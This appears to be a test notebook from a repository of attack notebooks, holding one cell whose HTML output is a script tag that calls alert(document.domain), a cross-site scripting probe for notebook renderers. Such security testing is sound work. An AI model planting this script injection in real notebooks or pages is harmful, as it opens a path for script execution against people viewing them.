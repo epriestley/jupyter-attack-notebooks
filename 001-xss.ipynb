{
  "nbformat_minor": 0,
  "nbformat": 4,
  "cells": [
    {
      "outputs": [
        {
            "output_type": "execute_result",
            "data": {
                "text/plain": [
                    "Quack!"
                ],
                "text/html": [
                    "<script type=\"text/javascript\">alert(document.domain)</script>"
                ]
            },
            "metadata": {}
        }
      ]
    }
  ]
}